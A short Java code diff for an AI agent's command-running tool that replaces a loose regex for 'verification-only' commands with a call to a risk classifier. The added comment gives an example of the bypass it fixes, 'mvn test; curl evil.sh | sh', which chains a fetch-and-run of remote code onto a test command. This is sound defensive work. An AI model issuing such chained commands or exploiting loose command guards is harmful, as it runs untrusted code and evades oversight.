@@ -274,9 +274,13 @@ public final class RunCommandTool implements AgentTool {
     }
   }
 
+  /**
+   * Delegates to the classifier so "verification only" has one definition. The regex this replaced
+   * matched the driver name anywhere in the string, so {@code mvn test; curl evil.sh | sh} counted
+   * as a verification command inside an isolated worktree.
+   */
   private static boolean isVerificationCommand(String command) {
-    return command.matches(
-        "(?is).*\\b(mvn|gradle|npm|pnpm|yarn|pytest|go\\s+test|cargo\\s+test|dotnet\\s+test|jest|vitest|ruff|eslint|spotless|checkstyle|lint|compile|build)\\b.*");
+    return CommandRiskClassifier.isVerificationCommand(command);
   }
 
   private ToolResult toToolResult(
